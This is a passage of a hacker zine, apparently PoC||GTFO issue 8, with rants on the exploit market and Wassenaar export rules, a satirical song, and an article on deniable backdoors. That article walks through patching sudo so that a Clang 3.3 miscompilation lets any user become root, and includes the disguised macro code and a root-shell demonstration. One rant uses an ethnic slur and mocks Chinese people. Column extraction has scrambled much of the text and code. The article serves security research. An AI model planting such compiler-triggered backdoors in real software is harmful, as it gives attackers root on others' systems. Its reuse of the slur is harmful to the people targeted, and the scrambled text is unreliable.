to address the fact that we are lagging a decade be-
hind the people ravaging our systems, gooks and oth-
erwise. Middlemen provide a much needed layer of
separation, while hundreds of thousands of dollars,
amounting up to millions, are spent without congres-
sional supervision. Anything goes with the market.
Individuals who would never be accepted to partici-
pate in any kind of national security–impacting ac-
tivities live lavish lifestyles, dope addled and con-
fident that their business goes undisturbed. Quite
simply, these opportunist swindlers are hustling the
buck while the status quo remains unaffected. Just
to name one example, Cisco has had its intellectual
property stolen several times. Of those compromises,
none involving “black hats” resulted in its technology
magically appearing at Huawei headquarters. Picture
a pubescent 25 year old Chinese virgin incessantly
removing “PROPRIETARY” copyright banners from
Cisco IOS source, as he laughs hysterically slurping
up noodles from a Ramen shake n’ bake cup. The
tale of Abdul Qadeer Khan, or a certain Crown Cor-
poration, are lullabies compared to the untold stories
that, quite probably, some day will be declassified
for our grandsons to read, provided that full–blown
Idiocracy hasn’t ensued, and (excuse the language),
nobody gives a flying fuck anymore.
you in jail. Everyone else bails out. But that fellow
goes there. Like a grandmother, without the weeping.
You shake hands. Share a few old stories. Implicitly,
you know he’s your only chance. But we’re drifting
slightly from our route. Crook Planet, it was. Yes.
If you were wondering where all those ethical evan-
gelists of the responsible disclosure creed went, well,
wonder no more. They’ve gone silent, because that’s
where the dough is at. Keeping silent. Not among
them, despite the NDAs in place, because they know
that remaining silent, makes them vulnerable when
facing buyers. There is irony about the turns of his-
tory. Here we are, trading mechanisms and tools
to subvert technology, when years ago we considered
their publication perfectly valid. And there is a need
for offensive capabilities. Are American corporations
and its federal government under attack? Yes, they
are. Does the market, as it is lined out right now,
help the tradecraft and improve the status quo? No,
it doesn’t. But millions are plunging into the pockets
of people whose interest, was, is and will always be
that we, including the government, remain insecure.
People have developed defensive technology that can
render certain paths of abuse completely unreliable.
The reaction of the greed–crazed freaks in the mar-
ket, which I and others in similar positions have on
record, ranged from negative to cocky (“It will drive
up the prices, good for us”). Well, you greedy swine,
Let’s gaze back at the past, something is wrong here. this was never about the money. At least, it wasn’t
Where did the responsible disclosure geeks go? It was for me. The kind of offensive capabilities I and my
a majestic party. Everyone was having a ball. Sud- company developed could have netted us immense
denly, everyone left and nobody bothered to clean the return on investment if used illegally. And so would
mess. Perhaps they found a new spiritual path, re- yours.
tiring to a tranquil life enjoying the fruits of the late The crude truth is that, by current market prices,
1990s and early to mid 2000s, carefree and happy to they don’t even come close to the risk–reward equa-
leave the snake oil salesman life behind. Did they take tion our adversaries have. Whether it is sixty thou-
vows of poverty, donated all they had to the Salva- sand or a quarter million for an exploit yielding high
tion Army, or the Dalai Lama, and left for Bhutan? privilege access to a modern operating system, the
Not quite. Please, let me, your humble host, guide price is still dramatically ridiculous if compared to
you to Crook Planet. It’s a strange place. I used the value of the intelligence and trade secrets that
to like it in here. Where I come from, they say when can be stolen from domestic corporations and the
you earn someone’s trust and friendship, it’s a lifelong government itself. The market fails to address any
deal. You break it, and you wish you had never been of the problems we face today, while it creates a very
friends with the poor bastard. In a way, it is bet- real threat. Are we protecting ourselves against the
ter to be wronged by someone you don’t know than exploits being traded among different agencies and
being played by someone you considered “a friend.” defense contractors? Not a chance. We could see
The word has reasonably dropped value these days. offensive security as the realm of smart men, whose
It’s short of meaning “someone I hang out with, can greed exceeded their talents, and made them shit in
get reasonably drunk with, but that’s about it.” A their own nests. Those teenagers who were shrugged
long time ago, a friend and mentor told me a real off by the industry in the early 2000s (despite the
friend is the calm guy bothering himself to go visit fact that they managed to publish personal informa-
59tion of industry professionals and routinely compro-
mised their systems, assumed to be, at the very least,
slightly more secure than those of the laymen) com-
promised Fortune 50 corporations and obtained trade
secrets ranging from proprietary operating system
source code to design documents. For free, at zero
cost. The first hackers unlocking the Apple iPhone
had proprietary schematics of Samsung devices. To-
day, you can acquire the schematics of any phone in
the markets of Shenzhen, China. The most public
cases of “whistle blowers” have been individuals with
top level clearances. As wave after wave of swine beat
on their chests and chant patriotic lures, they salivate
for a piece of the defense budget, hoping policy never
changes. The problem, clearly, isn’t the need for of-
fensive capabilities. They are necessary. The Cold
War never quite went cold. What we don’t need,
though, is swine playing the prom queens for us. Be-
cause it is only a matter of time until this entire clus-
terfuck of a party backfires on us, and it’s going to be
an interesting crash landing when they start dodging
the liabilities. These people do not care about the
status quo. They are milking the cow, for as long as
it lasts, just like it happened when disclosing infor-
mation had any sizable “return on investment.” Once
the hush money goes away, they might as well go back
to the old tale of responsible disclosure. Crook Planet
is also Turncoat Planet.
fully, the federal government and its institutions
aren’t exclusively packed with swine and salesmen.
There are, too, good people, no different than you
or me, whose goal is to help their fellow men. Bau-
drillard called America “the last primitive society on
Earth.” A society capable of swift change, of both
great and depraved actions. Like good ole’ Hunter
said, “In a nation run by swine, all pigs are upward–
mobile and the rest of us are fucked until we can put
our acts together: Not necessarily to Win, but mainly
to keep from Losing Completely.” We better get this
act together, soon.
I have managed to arrive at this point still remain-
ing a gentleman. No names were called out. But if
something happened, if I had the wrong hunch, pro-
fessionally or personally, if I was disturbed in any way,
or those whom are dear to me, let it be clear enough,
that I’m not driven by wealth nor power, and even
though I’ve never supported organizations like Wik-
iLeaks, 39 I’m this fucking close to picking up a phone
and start slipping letters into mail boxes.
All these years, when companies such as Microsoft
created databases filled with files on the scene (thanks
to their “Outreach” program, a theme park version of
a COINTELPRO), and contractors and firms did the
same, my own files grew in size, not with gossip, but
a very different kind of dirt. “To live outside the law
you must be honest,” as the Dylan song goes.
Everyone is willing to remain silent, for a fee. De-
The question is: are we feeling lucky? Well. . . Are
veloping security mitigations to protect both the de-
we?
fense industry and the layman is frowned upon. Talk-
ing about the market is frowned upon. Disclosing
that former “ethical security researchers” are in it and
silent for the big bucks is frowned upon. Acknowl- Sincerely yours,
edging that the adversary is ahead of us because we
are greedy swine hustling for tax payers’ money is
frowned upon. It’s all bad for “business.” This hyped
up “cyber war” of sorts, unless we do something about
it, and do it now, is going to be about as successful as
the “War on Drugs” and the “War on Terror.” Billions
going into the deep pockets of people whose creed is
green, and made out of dollar bills, but are too dumb
to figure out, that in the scheme of things, they are
their (and our) own worst enemies.
So much for sworn commitment to defend the Con- Count Bambaata, Head of the
stitution and laws of the United States against all Department of Swine Slaughtering and
enemies, foreign and. . . Domestic? For a fee. Thank- Angry Letters Filled With Expletives
39 With their eerie fixation on demonizing America, as much as we owe domestic swine for letting them have any dirt in first
place, let’s not confuse things here and dodge the blame.
6010
Public Service Announcement
We dedicate this page to public service, offering a handy cheat sheet for all the would–be regulators of 0–day
sales and cyberbullets, so that they don’t keep embarrassing themselves in public by misusing the words of
our profession. If you know such an aspiring regulator, please feel free to cut this page out on the dotted
line and mail it to them!
Zero–day Cyberbullet Regulation
Cheat Sheet & Fashion Advice
If Cyber is your style, Zero–day Regulation is “in” this legislative season. An-
noyingly, cyberbullet merchants–of–death use too much technical jargon to
hawk their deadly Turing–complete wares, and it’s all too easy to mix them
all up. Now that would be embarrassing, wouldn’t it?
But despair not! With this handy cheat sheet you will soon be legislating
cyberbullet export restrictions on evil cyberhackers like a cyberpro!
And remember: whatever your proposal, neither IMSI Catchers nor Rogue
Wi–Fi Access Points are “exploits.” Exploits are what you used to jailbreak
your iPhone to load the apps that you want but Apple doesn’t; never confuse
the two!
6111
Cyber Criminal’s Song
Arranged for an Anonymized Voice and the HN chorus
by Ben Nagy
(with abject apologies to G&S)
I am the very model of modern Cybercriminal
I’ve knowledge hypothetical that’s technical and chemical
And conduct most becoming, both grammatical and ethical!
I build my site with PHP so coders are replaceable
I keep it all behind, like, seven proxies and a firewall
And Tor is such secure so wow - my webs are much unbreakable!
I’m careful with my secret life, I haven’t told a single soul
(Except three guys on Xbox Live and Chad whose .torrc I stole)
[CHORUS]
SERIOUSLY, THANKS CHAD, THAT CONFIG IS TOTALLY SWEEET
My cash is stored in bitcoin, the transactions are untraceable
I read on Hacker News that the cryptography’s exceptional
And so, on matters technical, theoretical, and chemical
I am the very model of modern Cybercriminal!
I’m totes well versed in Haskell and I love the lambda calculus
I know Actionscript and Coffeescript and XML and CSS
And OCaml and Rust and D and Clojure plus some Common LISP
My daring Cyberlife is like The Matrix with a modern twist!
(But to stay close the metal I prefer to roll with node.js)
[CHORUS]
TO STAY CLOSE TO THE METAL WE PREFER TO ROLL ON NODE JSSSSSS
For matters pharmaceutical I’m well researched on Erowid
From Aderall to Zolpidem and Dexedrine to Dicodid
From re-uptake inhibitors to analgesic opioids
I know the pharmacology of all the drugs the world enjoys
Good Sir, in fields theoretical, chemical, and technical
I am the very model of modern Cybercriminal!
I downloaded all five seasons of The Wire from The Pirate Bay
And studied all their OPSEC and legalities of what to say
If interviewed by cops and, well, I must admit it’s child’s play
How do these people make mistakes? Such staggering naı̈veté!
[CHORUS]
WE’D NEVER MAKE SUCH NOOB MISTAKES WE LAUGH AT YOUR NAÏVETÉ
62My records are impeccable, I keep them all in triplicate
I know what day I paid for my new Tesla or my contract hits
I run GNUCash on Linux my finances are so intricate
And all backed up to Google Docs which makes me a Cloud Syndicate.
[CHORUS]
WE’RE REALLY VERY SORRY BUT WELL ACTUALLY IT’S GNU/LINUX
Then, I can quote Sun Tzu or Nietzsche highlights from the Internet
My strategies are therefore quite profound much like my intellect
Yes, for all things theoretical, technical and chemical
I am the very model of a modern Cybercriminal!
In fact, when I know what is meant by “cover” and “concealment”
When I can keep my Facebook, Yelp and Tinder in a compartment
Or when I know the difference ’tween a public and a private key
Stop logging in to check my recent sales from the library
When I can keep my mouth shut in a bar just momentarily
In short, when I have frankly any skills that go beyond my screen
You’ll say no better Cybercriminal the world has ever seen!
Though criminally weak, you’ll find I’m plucky and adventury
And though my reading starts at the beginning of the century
On matters theoretical, technical and chemical
I am totally the model of a modern Cybercriminal!
[CHORUS]
THE VERY VERY MODEL OF THE MODERN CYBER CRIMINAL!
6312
Fast Cash for Bugs!
by Pastor Manul Laphroaig, Proselytizer of Weird Machines
Howdy, neighbor! Is that a fresh new PoC you are hugging so close? Don’t stifle it, neighbor, it’s time
for it to see the world, and what better place to do it than from the pages of the famed International Journal
of PoC or GTFO? It will be in a merry company of other PoCs big and small, bit–level and byte–level, raw
binary or otherwise, C, Python, Assembly, hexdump or any other language. But wait, there’s more—our
editors will groom it for you, and dress it in the best Sunday clothes of proper church English. And when it
looks proudly back at you from these pages, in the company of its new friends, won’t that make you proud?
So set that little PoC free, neighbor, and let it come to me, pastor@phrack org!
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Do this: write an email telling our editors how to do reproduce *ONE* clever, technical trick from your
research. If you are uncertain of your English, we’ll happily translate from French, Russian, or German. If
you don’t speak those languages, we’ll dig up a translator.
Like an email, keep it short. Like an email, you should assume that we already know more than a bit
about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long tutorial
where a quick reminder would do.
Don’t try to make it thorough or broad. Don’t use Powerpoint bullet–points or OpenOffice Unicode;
we’ll typeset it for you.
Do pick one quick, clever low–level trick and explain it in a few pages. Teach me how to make music
that also parses as PSK31, RTTY, or WeFax. Show me how to reverse engineer SoftStrip barcodes. Don’t
tell me that it’s possible; rather, teach me how to do it myself with the absolute minimum of formality and
bullshit.
Like an email, we expect informal (or faux–biblical) language and hand–sketched diagrams. Write it in a
single sitting, and leave any editing for your poor preacherman to do over a bottle of fine scotch. Send this
to pastor@phrack org and hope that the neighborly Phrack folks—praise be to them!—aren’t man–in–the–
middling our submission process.
64AS EXPLOITS SIT LONELY,
FORGOTTEN ON THE SHELF
YOUR FRIENDLY NEIGHBORS AT
PoC k GTFO
PROUDLY PRESENT
PASTOR MANUL LAPHROAIG’S
EXPORT–CONTROLLED
CHURCH NEWSLETTER
June 20, 2015
8:3 Backdoors from Compiler Bugs 8:8 On Error Resume Next for Unix
8:4 A Protocol for Leibowitz 8:9 Sing Along with Toni Brixton
8:5 Reprogramming a Mouse Jiggler 8:10 Backdooring Nothing-Up-My-Sleeve Numbers
8:6 Exploiting an Academic Hypervisor 8:11 Building a Wireless CTF
8:7 Weaponized Polyglots as Browser Exploits 8:12 Grammatically Correct Encryption
Fort Ville-Marie, Vice-royauté de Nouvelle-France:
Funded by Single Malt as Midnight Oil and the
Tract Association of PoCkGTFO and Friends,
to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
Это самиздат; yet, do thy worst old Time!
0, $0 USD, £0, $50 CAD. pocorgtfo08.pdf.
1Legal Note: You wouldn’t let Госкомиздат or Главлит tell you what to read, and you wouldn’t let GEMA tell
you which Youtube videos to watch, so why in hell would you let copyright law tell you what to print? This work is
scripture, and as such, it has no copyright.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo08.pdf and our other issues far and wide, so our articles can help fight the
coming robot apocalypse.
Technical Note: This issue is a polyglot that can be meaningfully interpreted as a ZIP, a PDF and a Shell script
featuring the weird cryptosystem described in 8:12. We are the technical debt collectors!
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed duplex,
then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper in Samland. Secret
government labs in Canada may use P3 (280 mm x 430 mm) if they like. The outermost sheet should be on thicker
paper to form a cover. To get a duplex version, just do:
u n z i p p o c o r g t f o 0 8 . p d f p o c o r g t f o 0 8 −b o o k l e t . p d f
Preacherman
Ethics Advisor
Poet Laureate
Editor of Last Resort
Carpenter of the Samizdat Hymnary
Editorial Whipping Boy
Funky File Formats Polyglot
Assistant Scenic Designer
Supreme Infosec Thought Commander
Minister of Spargelzeit Weights and Measures
2
Manul Laphroaig
The Grugq
Ben Nagy
Melilot
Redbeard
Jacob Torrey
Ange Albertini
Philippe Teuwen
Taylor Swift
FX1
Please stand; now, please be seated.
Neighbors, please join me in reading this ninth
release of the International Journal of Proof of Con-
cept or Get the Fuck Out, a friendly little collection
of articles for ladies and gentlemen of distinguished
ability and taste in the field of software exploita-
tion and the worship of weird machines. If you are
missing the first eight issues, we the editors suggest
pirating them from the usual locations, or on pa-
per from a neighbor who picked up a copy of the
first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiving
holiday, or the eighth in Heidelberg. This is our sec-
ond epistle to Montréal, because we love that city
and its fine neighbors.
Saumil Shah says that a good exploit is one that
is delivered in style, and Bukowski says that style is
the answer to everything, a fresh way to approach
a dull or dangerous thing. On page 27, Saumil
presents us with tricks for encoding browser exploits
as image files. Saumil has style.
Back in the days of Visual Basic 6, there was a
directive, on error resume next, that instructed
the interpreter to ignore any errors. Syntax error?
Divide by zero? Wrong number of parameters? No
problem, the program would keep running, the in-
terpreter doing its very best to do something with
the hideous mess of spaghetti code that VB pro-
grammers are famous for. On page 45, Jeffball from
DC949 commits the criminal act of porting this be-
havior to C on Linux.
On page 47, Tommy Brixton sings a heartbreak-
ing classic, Unbrick My Part!
On page 48, JP Aumasson talks about those
fancy little NUMS—Nothing Up My Sleeve—
numbers. He keeps a lot of them up his sleeves.
On page 55, Russell Handorf teaches us how to
build a Wireless CTF on the cheap, broadcasting a
number of different protocols through Direct Digital
Synthesis on a Raspberry Pi.
On page 60, Philippe Teuwen explains how he
made this PDF into a polyglot able to secure your
communications by encrypting plain English into—
wait for it—plain English! Still better, all cipher text
is grammatical English!
On page 64, the last and most important
page, we pass around the collection plate. Pastor
Laphroaig doesn’t need a touring jumbo jet like
those television and radio preachers; rather, this
humble worshiper of the weird machines just needs
an arms-export license in order to keep his church
newsletter legal under the the Wassenaar Arrange-
ment on Export Controls for Conventional Arms and
Dual-Use Goods and Technologies. From those of
you who are not Lords of War, we also gladly ac-
cept alms of PoC.
Page 4 contains our own Pastor Manul
Laphroaig’s rant on the recent Wassenaar amend-
ments, which will have us all burned as witches.
On page 7, Scott Bauer, Pascal Cuoq, and John
Regehr present a backdoored version of sudo, but
why should we give a damn whether anyone can
backdoor such an application? Well, these fine
neighbors abuse a pre-existing bug in CLANG that
snuck past seventeen thousand assertions. Thus, the
backdoor in their version of sudo provably doesn’t
exist until after compilation with a particular com-
piler. Ain’t that clever?
On page 10, Travis Goodspeed and his neigh-
bor Muur present fancy variants of digital short-
wave radio protocols. They hide text in the null
bits between PSK31 letters and in the space between
RTTY bytes. Just for fun, they also transmit Morse
code from 100 Mbit Ethernet to a nearby shortwave
receiver!
It’s common practice in some IT departments
to use a Mouse Jiggler, such as the Weibetech MJ-
3, to keep a screensaver from password protecting
a seized computer while waiting for a forensic an-
alyst. Mickey Shkatov took one of these doodads
apart, and on page 20 he shows how to reprogram
one.
On page 24, DJ Capelis and Daniel Bittman
present a hypervisor exploit that was unwanted by
the academic publishers. As our Right Reverend has
better taste than the Unseen Academics, we happily
scooped up their neighborly submission for you, our
dear reader.
32
Witches, Warlocks, and Wassenaar; or,
On the Internet, no one knows you are a witch.
Gather round, neighbors!
Neighbors, I said, but perhaps I should have
called you fellow witches, warlocks, arms dealers,
and other purveyors of heretic computation. For our
pursuits have been weighed, measured, and found
wanting for whatever it is these days that still allows
people of skill to pursue that skill without manda-
tory oversight. Now our carefree days of bewitching
our neighbors’ cattle and dairy products are draw-
ing to a close; our very conversation is a weapon
and must, for our own good, be exercised under the
responsible control of our moral betters.
And what is our witchcraft, the skill so dire that
these said betters have girt themselves to “regulate
your shady industry out of existence”? Why, it’s ap-
parently our mystical and ominous ability to write
programs that create “modification of the standard
execution path of a program or process in order to
allow the execution of externally provided instruc-
tions”. We speak secret and terrible words, and
these make our neighbors’ softwares suddenly and
unexpectedly lose their virtue. The evil we con-
jure congeals out of the thin air; never mind the
neglect and the feeble excuses that whatever causes
the plague will not be burned with the witch.
Come to think of it, rarely a suspected witch or
a warlock have had the case against them laid out in
such a crisp definition. Indeed, the days of spectral
evidence are over and done; now the accused can
be confronted with an execution trace! The judg-
ment may pass you over if you claim the sanctuary of
your craft being limited to Hypervisors, Debuggers,
Reverse Engineering Tools, or—surprise, surprise!—
DRM; for these are what a good wizard is allowed
to exercise. However, dare to deviate into “propri-
etary research on the vulnerabilities and exploitation
4of computers and network-capable devices”, and your
goose is cooked, and so are your “items that have or
support rootkit or zero-day exploit capabilities.” 1
Heretics as we are, we turn our baleful and en-
vious eye towards the hallowed halls of science. Be-
hold, here are a people under a curious spell: they
must talk of things that are not yet known to their
multitudes—that which we call “zero-day”—or they
will not be listened to by their peers. Indeed, what
we call “zero-day” they call a “discovery,” or simply
a “publication.” It’s weird how advancement among
them is meant to be predicated on the number of
these “zero-day” results they can discover and pub-
lish; and they are free to pursue this discovery for
either public and private ends after a few distin-
guished “zero-days” are published and noted.
What a happy, idyllic picture! It might or
might not have been helped by the fact that those
sovereigns who went after the weird people in robes
tended to be surprised by other sovereigns who had
the fancy to leave them alone and to occasionally
listen to their babbling. But, neighbors, this lesson
took centuries, and anyway, do we have any god-
damn robes? No, we only have those stupid bal-
aklavas we put on when we sit down to our kind of
computing, and that doesn’t really count.
Ah, but can’t we adopt robes too, or at least just
publish everything we do right away 2 , to seek the
protection of the “publish or perish” magic that has
been working so well for the people who use the same
computers we do but pay to present their papers at
their conferences? Well, so long as we are able to
ditch our proprietary tools and switch to those that
mysteriously stop compiling after their leading au-
thor has graduated—and what could go wrong? Af-
ter all, it’s mere engineering detail that the private
startups and independent researchers ever provide
to a scientific discipline, and they could surely do it
on graduate student salaries instead!
But, a reasonable voice would remind us, not all
is lost. Our basic witchcraft is safe, for the devilish
“intrusion software”, our literal spells and covenants
with the Devil, is not in fact to be controlled! We
are free to exchange those so long as we mean to do
good works with them and eventually share them
with our betters or the public. It’s only the means
of “generating” the new spells that must be watched;
it’s only methods to “develop” the new knowledge
that you will get in trouble for. Indeed, our pre-
cious weird programs are safe, it’s only the programs
to write these programs that will put you under the
witches’ hammer of scrutiny. We have been saved,
neighbors—or have we?
I don’t know, neighbors. Among the patron
saints of our craft we distinguish the one who in-
vented programs that write programs, and, inciden-
tally, filed the first bug (if somewhat squashed in the
process), and the one whose Turing award speech
was about exploiting such programs—so important
and invisible in our trust they have become, so fast.
We spend hours to automate tasks that would take
minutes; we grow by making what was an arcane
art of the few accessible to many, through tools that
make the unseen observable and then transparent.
Of all the tool-making species, we might be the
most devoted to our tools, tolerating no obscurity
and abhorring impenetrable abstraction layers left
so “for our own benefit.” And yet it is this toolmak-
ing spirit that we must surrender to scrutiny and a
regime of prior permission—or else.
Is it merely a coincidence that the inventor of the
compiler is also credited with “It is much easier to
apologize than it is to get permission”? Apparently,
there were the times when this method worked; we’ll
have to see if it sways the would-be inquisitors into
our craft of heretical computations.
Thank you kindly,
—PML
1 https://www.federalregister.gov/articles/2015/05/20/2015-11642/wassenaar-arrangement-2013-plenary-agreements-
implementation-intrusion-and-surveillance-items
2 Affording the time for proper peer review, of course, that is, the time for the random selection of peers to catch up with
what one is doing. But what’s a year or two on the grand Internet scale of things, eh?
563
Deniable Backdoors Using Compiler Bugs
by Scott Bauer, Pascal Cuoq, and John Regehr
Do compiler bugs cause computer software to be-
come insecure? We don’t believe this happens very
often in the wild because (1) most code is not mis-
compiled and (2) most code is not security-critical.
In this article we address a different situation: we’ll
play an adversary who takes advantage of a natu-
rally occurring compiler bug.
Do production-quality compilers have bugs?
They sure do. Compilers are constantly evolving
to improve support for new language standards, new
platforms, and new optimizations; the resulting code
churn guarantees the presence of numerous bugs.
GCC currently has about 3,200 open bugs of priority
P1, P2, or P3. (But keep in mind that many of these
aren’t going to cause a miscompilation.) The invari-
ants governing compiler-internal data structures are
some of the most complex that we know of. They are
aggressively guarded by assertions, roughly 11,000
in GCC and 17,000 in LLVM. Even so, problems
slip through.
How should we go about finding a compiler bug
to exploit? One way would be to cruise an open
source compiler’s bug database. A sneakier alterna-
tive is to find new bugs using a fuzzer. A few years
ago, we spent a lot of time fuzzing GCC and LLVM,
but we reported those bugs—hundreds of them!—
instead of saving them for backdoors. These compil-
ers are now highly resistant to Csmith (our fuzzer),
but one of the fun things about fuzzing is that ev-
ery new tool tends to find different bugs. This has
been demonstrated recently by running afl-fuzz
against Clang/LLVM. 3 A final way to get good com-
piler bugs is to introduce them ourselves by submit-
ting bad patches. As that results in a “Trusting
Trust” situation where almost anything is possible,
we won’t consider it further.
So let’s build a backdoor! The best way to do
this is in two stages, first identifying a suitable bug
in the compiler for the target system, then we’ll in-
troduce a patch for the target software, causing it
to trip over the compiler bug.
The sneaky thing here is that at the source code
level, the patch we submit will not cause a secu-
rity problem. This has two advantages. First, obvi-
ously, no amount of inspection—nor even full formal
verification—of the source code will find the prob-
lem. Second, the bug can be targeted fairly specifi-
cally if our target audience is known to use a partic-
ular compiler version, compiler backend, or compiler
flags. It is impossible, even in theory, for someone
who doesn’t have the target compiler to discover our
backdoor.
Let’s work an example. We’ll be adding a privi-
lege escalation bug to sudo version 1.8.13. The tar-
get audience for this backdoor will be people whose
system compiler is Clang/LLVM 3.3, released in
June 2013. The bug that we’re going to use was
discovered by fuzzing, though not by us. The fol-
3 http://permalink.gmane.org/gmane.comp.compilers.llvm.devel/79491
7lowing is the test case submitted with this bug. 4
1 int x = 1 ;
i n t main ( void ) {
3
i f ( 5 % ( 3 ∗ x ) + 2 != 4 )
__builtin_abort ( ) ;
5
return 0 ;
}
220 user_match = u s e r l i s t _ m a t c h e s ( sudo_user . pw ,
&us−>u s e r s ) ;
debug_continue ( ( user_match != ALLOW) ,
DEBUG_NOTICE,
222
"No u s e r match , c o n t i n u i n g t o
s e a r c h \n" ) ;
The debug_continue macro isn’t quite as out-
of-place as it seems at first glance. Nearby we can
find this code for printing a debugging message and
returning an integer value from the current function.
According to the C language standard, this pro-
gram should exit normally, but with the right com-
piler version, it doesn’t!
$ c l a n g −v
2 c l a n g v e r s i o n 3 . 3 ( t a g s /RELEASE_33/ f i n a l )
Ta rge t : x86_64−unknown−l i n u x −gnu
Thread model : p o s i x
4 $ c l a n g −O bug . c
$ . / a . out
6 Aborted
debug_return_int ( v a l i d a t e d ) ;
The debug_continue macro is defined at
include/sudo_debug.h:112 to hide our trickery.
112 #define debug_continue ( c o n d i t i o n , dbg_lvl , \
str , . . . ) {
\
114
i f (NORMALIZE_DEBUG_LEVEL( dbg_lvl )
\
Is this a good bug for an adversary to use as
&& ( c o n d i t i o n ) ) {
\
sudo_debug_printf (SUDO_DEBUG_NOTICE,
\
the basis for a backdoor? On the plus side, it ex- 116
s t r , ##__VA_ARGS__) ;
\
ecutes early in the compiler—in the constant fold-
118
continue ;
\
ing logic—so it can be easily and reliably triggered
}
\
across a range of optimization levels and target plat- 120 }
forms. On the unfortunate hand, the test case from
the bug report really does seem to be minimal. All
of those operations are necessary to trigger the bug,
so we’ll need to either find a very similar pattern in
the system being attacked or else make an excuse to
110
introduce it. We’ll take the second option.
5
Our target program is version 1.8.13 of sudo, 112
a UNIX utility for permitting selected users to run
processes under a different uid, often 0: root’s uid.
When deciding whether to elevate a user’s privileges,
sudo consults a file called sudoers. We’ll patch
sudo so that when it is compiled using Clang/L-
LVM 3.3, the sudoers file is bypassed and any
user can become root. If you like, you can follow 108
along on Github. 6 First, under the ruse of improv- 110
ing sudo’s debug output, we’ll take this code at
plugins/sudoers/parse.c:220.
220 i f ( u s e r l i s t _ m a t c h e s ( sudo_user . pw , &us−>
u s e r s ) != ALLOW)
continue ;
This further bounces to another preprocessor
macro.
#define NORMALIZE_DEBUG_LEVEL( dbg_lvl )
(DEBUG_TO_VERBOSITY( dbg_lvl )
== SUDO_DEBUG_NOTICE)
\
\
And that macro is the one that triggers our bug.
(The comment about the perfect hash function is
the purest nonsense, of course.)
/∗ P e r f e c t hash f u n c t i o n f o r mapping debug
l e v e l s t o i n t e n d e d v e r b o s i t y ∗/
#define DEBUG_TO_VERBOSITY( d )
\
(5 % (3 ∗ (d) ) + 2)
Would our patch pass a code review? We hope
not. But a patient campaign of such patches, spread
out over time and across many different projects,
would surely succeed sometimes.
Next let’s test the backdoor. The patched sudo
builds without warnings, passes all of its tests, and
We can trigger the bug by changing this code
around a little bit.
4 Bug
15940 from the LLVM Project
pocorgtfo08.zip sudo-1.8.13-compromise.tar.gz
6 https://github.com/regehr/sudo-1.8.13/compare/compromise
5 unzip
8the backdoor can maintain their reputation, and
contribute to other security-sensitive open source
projects, without even needing to remove it from
sudo’s source code. This means that the author can
be an occasional contributor, as opposed to having
to be the main author of the backdoored program.
How would you defend your system against an
attack that is based on a compiler bug? This is not
so easy. You might use a proved-correct compiler,
such as CompCert C from INRA. If that’s too dras-
tic a step, you might instead use a technique called
translation validation to prove that—regardless of
the compiler’s overall correctness—it did not make
a mistake while compiling your particular program.
Translation validation is still a research-level prob-
lem.
In conclusion, are we proposing a simple, low-
cost attack? Perhaps not. But we believe that it
represents a depressingly plausible method for in-
serting hard-to-find and highly deniable backdoors
into security-critical code.
installs cleanly. Now we’ll login as a user who is defi-
nitely not in the sudoers file and see what happens:
$ whoami
2 mark
$ ~ r e g e h r /bad−sudo / b i n / sudo bash
4 Password :
#
Success! As a sanity check, we should rebuild
sudo using a later version of Clang/LLVM or any
version of GCC and see what happens. Thus we
have accomplished the goal of installing a backdoor
that targets the users of just one compiler.
1 $ ~ r e g e h r /bad−sudo / b i n / sudo bash
Password :
3 mark i s not i n t h e s u d o e r s f i l e .
This i n c i d e n t w i l l be r e p o r t e d .
5 $
–——–
———
—–—–
We need to emphasize that this compromise is
fundamentally different from the famous 2003 Linux
backdoor attempt, 7 and it is also different from se-
curity bugs introduced via undefined behaviors. 8 In
both of those cases, the bug was found in the code
being compiled, not in the compiler.
The design of a source-level backdoor involves
trade-offs between deniability and unremarkability
at the source level on the one hand, and the speci-
ficity of the effects on the other. Our sudo backdoor
represents an extreme choice on this spectrum; the
implementation is idiosyncratic but irreproachable.
A source code audit might point out that the patch
is needlessly complicated, but no amount of testing
(as long as the sudo maintainers do not think to use
our target compiler) will reveal the flaw. In fact,
we used a formal verification tool to prove that the
original and modified sudo code are equivalent, the
details are in our repo. 9
An ideal backdoor would only accept a specific
“open sesame” command, but ours lets any non-
sudoer get root access. It seems difficult to do better
while keeping the source code changes inconspicu-
ous, and that makes this example easy to detect
when sudo is compiled with the targeted compiler.
If it is not detected during its useful life, a
backdoor such as ours will fade into oblivion to-
gether with the targeted compiler. The author of
7 https://freedom-to-tinker.com/blog/felten/the-linux-backdoor-attempt-of-2003
8 unzip
pocorgtfo08.pdf exploit2.txt
9 https://github.com/regehr/sudo-1.8.13/tree/compromise/backdoor-info
94
A Protocol for Leibowitz; or,
Booklegging by HF in the Age of Safe Æther
by Travis Goodspeed and Muur P.
Howdy y’all!
message (CQ CQ CQ de A1ICE A1ICE Pse k), and
nothing may draw undue attention to their com-
munications. Bob, however, is able to find a secret,
second meaning.
In this article, we’ll introduce you to some of the
steganographic tricks they could use, as well as some
less stealthy—and more neighborly—ways to com-
bine protocols. We’ll start with PSK31 and RTTY,
with a bit of CW for good measure. And just to
show off, we’ll also bring wired Ethernet into the
mix, for an exfiltration trick worthy of being shared
around campfires! 13
Today we’ll discuss overloading of protocols for
digital radio. These tricks can be used to hide data,
exfiltrate it, watermark it, and so on. The nifty
thing about these tricks is that they show how mod-
ulation and encoding of digital radio work, and how
receivers for it are built, from really simple proto-
cols like the amateur radio PSK31 and RTTY to
complex ones like 802.11, 802.15.4, Bluetooth, etc.
We’ll start with narrow-band protocols that you
can play with at audio frequencies. So if you don’t
have an amateur license and a shortwave transceiver,
you can use your sound card to do most of the work
and run an audio cable between two laptops to send
and receive it. 10
–——–
———
—–—–
Suppose that sometime in the future, our neigh-
bor Alice lives in an America of modern–day Ne-
hemiah Scudder, 11 whose Youtube preachers and
Twitter lynch mobs have made the Internet into a
Safe Zone for America’s Youth, by disconnecting it
from anything unsafe. So Alice’s only option to get
something unsafe to read is from Booklegger Bob in
Canada, by shortwave radio.
